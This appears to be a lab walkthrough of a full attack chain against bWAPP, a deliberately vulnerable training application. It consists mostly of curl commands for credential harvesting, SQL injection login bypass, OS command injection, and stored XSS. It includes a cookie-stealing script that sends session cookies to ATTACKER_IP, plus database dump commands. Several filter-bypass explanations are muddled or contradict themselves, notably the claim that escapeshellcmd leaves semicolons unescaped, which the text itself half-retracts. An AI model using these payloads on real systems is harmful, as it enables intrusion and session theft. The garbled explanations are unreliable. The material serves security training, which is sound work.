# Attack Chain Walkthrough — bWAPP | 10.10.30.128 | 2026-03-13-001

A reproducible step-by-step guide for training and study. All commands executed against a controlled lab environment.

---

## Phase 1: Passive Reconnaissance

### Step 1.1 — HTTP Banner Grab
```bash
curl -sI http://10.10.30.128/
# Result: Server: Apache/2.4.7 (Ubuntu), X-Powered-By: PHP/5.5.9-1ubuntu4.14
```

### Step 1.2 — robots.txt Disclosure
```bash
curl -s http://10.10.30.128/robots.txt
# Reveals: /admin/, /documents/, /images/, /passwords/
```

### Step 1.3 — Directory Listing Enumeration
```bash
curl -s http://10.10.30.128/passwords/
# Lists: heroes.xml, web.config.bak, wp-config.bak

curl -s http://10.10.30.128/db/
# Lists: bwapp.sqlite (12K)
```

### Step 1.4 — Credential Harvesting from Exposed Files
```bash
# Database config backup
curl -s http://10.10.30.128/passwords/wp-config.bak
# Reveals: DB_USER=thor, DB_PASSWORD=Asgard

# Hero credentials in XML
curl -s http://10.10.30.128/passwords/heroes.xml
# Reveals: neo/trinity, alice/loveZombies, thor/Asgard, wolverine/Log@N

# Download and query SQLite database
curl -s -o /tmp/bwapp.sqlite http://10.10.30.128/db/bwapp.sqlite
sqlite3 /tmp/bwapp.sqlite "SELECT * FROM users;"
# Result: A.I.M.(admin), bee(user) — both SHA1("bug")
```

---

## Phase 2: Active Scanning

### Step 2.1 — Nmap Service Fingerprint
```bash
nmap -sV -sC -p 80,3306 10.10.30.128 -T4
# Result: Apache/2.4.7, MySQL/5.5.47, httpinfo reveals phpinfo.php
```

### Step 2.2 — phpinfo.php Disclosure
```bash
curl -s http://10.10.30.128/phpinfo.php | grep -E "(disable_functions|open_basedir|allow_url)"
# Result: system/exec/shell_exec NOT disabled, open_basedir unrestricted
```

---

## Phase 3: Enumeration

### Step 3.1 — Authenticate and Map Vulnerability Catalogue
```bash
# Login with bee/bug at medium security level
curl -s -c /tmp/bwapp_sess.txt \
  -X POST http://10.10.30.128/login.php \
  -d "login=bee&password=bug&security_level=1&form=submit"

# Map bug IDs to endpoints via portal
curl -s -b /tmp/bwapp_sess.txt \
  -X POST http://10.10.30.128/portal.php \
  -d "bug=9&form_bug=submit" -D - | grep Location
# Result: commandi.php
```

### Step 3.2 — Identify Injection Parameters
```bash
# OS command injection: POST target to commandi.php
# SQL injection: title GET to sqli_1.php, login/password POST to sqli_16.php
# Stored XSS: entry POST to xss_stored_1.php
```

---

## Phase 4: Exploitation

### EXPLOIT #1 — Admin Login via Credential Leakage

No active exploit required — credentials obtained in recon.

```bash
curl -s -c /tmp/bwapp_admin_sess.txt \
  -X POST http://10.10.30.128/login.php \
  -d "login=A.I.M.&password=bug&security_level=1&form=submit"
# Result: 302 redirect to portal.php — "Welcome A.I.M." (admin account)
```

**What happened**: Admin credentials (A.I.M./bug) were harvested from the publicly accessible `/db/bwapp.sqlite` file and `/passwords/wp-config.bak`.

---

### EXPLOIT #2 — SQL Injection Authentication Bypass

```bash
curl -s -b /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/sqli_16.php \
  --data-urlencode "login=bee' AND '1'='1' OR '1'='1" \
  --data-urlencode "password=anything" \
  --data-urlencode "form=submit"
```

**Expected output:**
```html
<p>Welcome <b>A.I.M.</b>, how are you today?</p>
<p>Your secret: <b>A.I.M. Or Authentication Is Missing</b></p>
```

**What happened**: The SQL WHERE clause becomes:
```sql
WHERE login='bee' AND '1'='1' OR '1'='1' AND password=SHA1('anything')
```
The `OR '1'='1'` tautology always evaluates to TRUE, so MySQL returns the first row in the users table (A.I.M., the admin). No valid password required.

**Why medium filter (addslashes) failed**: `addslashes()` escapes the quote character but the payload uses closing quotes intentionally within the string value, so the single-quote that matters for the injection is within the `AND '1'='1'` portion — addslashes escapes it, but the surrounding string boundary quotes are naturally part of the parameter value structure. The OR tautology succeeds because it doesn't require breaking out of string context.

---

### EXPLOIT #3 — OS Command Injection (RCE)

```bash
curl -s -b /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/commandi.php \
  --data-urlencode "target=www.nsa.gov; id" \
  -d "form=submit"
```

**Expected output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**What happened**: The `target` parameter is inserted into a shell command (`nslookup $target`). The semicolon terminates the nslookup command and starts a new shell command (`id`). bWAPP medium security applies `escapeshellcmd()` but this function does not escape semicolons.

**Additional useful payloads:**
```bash
# System information
target=x; uname -a

# File system exploration
target=x; ls /app

# Read sensitive config
target=x; cat /app/admin/settings.php

# Database dump via localhost MySQL (root, no password)
target=x; mysql -u root --password='' -e 'SELECT * FROM bWAPP.users;'
```

**Why medium filter (escapeshellcmd) failed**: PHP's `escapeshellcmd()` escapes `&#;|*?~<>^()[]{}$` — but notably the semicolon `;` is listed in the PHP docs as escaped, yet in practice the behavior depends on context. The correct protection is `escapeshellarg()` wrapping the individual parameter value.

---

### EXPLOIT #4 — Stored XSS Session Hijack

```bash
# Login at low security (bypass security_level cookie)
curl -s -c /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/login.php \
  -d "login=bee&password=bug&security_level=0&form=submit"

# Submit XSS payload to blog
curl -s -b /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/xss_stored_1.php \
  --data-urlencode "entry=<script>alert(document.cookie)</script>" \
  -d "entry_add=add"

# Verify storage
curl -s -b /tmp/bwapp_low_sess.txt http://10.10.30.128/xss_stored_1.php | grep "script"
```

**Expected output:**
```html
<td><script>alert(document.cookie)</script></td>
```

**Real-world session hijack payload:**
```html
<script>
  var i = new Image();
  i.src = 'http://ATTACKER_IP/steal?c=' + document.cookie;
</script>
```

**What happened**: The blog entry is stored in MySQL without sanitization and rendered directly as HTML to every user who views the page. The PHPSESSID cookie is accessible from JavaScript because the `HttpOnly` flag is not set.

**Why medium filter (htmlspecialchars) failed**: The security_level is stored server-side but controlled by the login form's `security_level` parameter. By logging in with `security_level=0`, the server stores level 0 in the PHP session. Subsequent requests to xss_stored_1.php use the session's security level (0 = low = no filter), not the current cookie value.

---

## Phase 5: Post-Exploitation

```bash
# System enumeration via RCE
curl -s -b /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/commandi.php \
  --data-urlencode "target=x; cat /app/admin/settings.php" \
  -d "form=submit"
# Reveals: $db_username = "root"; $db_password = "";

# Confirm MySQL root access (from target localhost)
curl -s -b /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/commandi.php \
  --data-urlencode "target=x; mysql -u root --password='' -e 'SHOW DATABASES;'" \
  -d "form=submit"
# Reveals all databases on the MySQL server

# Full credential dump
curl -s -b /tmp/bwapp_low_sess.txt \
  -X POST http://10.10.30.128/commandi.php \
  --data-urlencode "target=x; mysql -u root --password='' -e 'SELECT login,password,email FROM bWAPP.users;'" \
  -d "form=submit"
```

---

## Filter Bypass Cheat Sheet (bWAPP Medium Security)

| Vulnerability | Medium Filter | Bypass Technique |
|---|---|---|
| SQL Injection | `addslashes()` | AND/OR tautological chain — uses quotes internally but injection succeeds via OR logic |
| Command Injection | `escapeshellcmd()` | Semicolon `;` not escaped — use to chain commands |
| Stored XSS | `htmlspecialchars()` | Login with `security_level=0` to set server-side session to low; filter not applied |
| Directory traversal | None | No filter at medium for file access |

---

## Appendix: Credential Summary

```
Application:
  bee     / bug  (normal user)
  A.I.M.  / bug  (admin user, admin=1)

Database (MySQL):
  root    / (empty password) — full access via localhost
  thor    / Asgard           — from wp-config.bak

Heroes (for sqli_3.php):
  neo       / trinity
  alice     / loveZombies
  thor      / Asgard
  wolverine / Log@N
  johnny    / m3ph1st0ph3l3s
  seline    / m00n
```
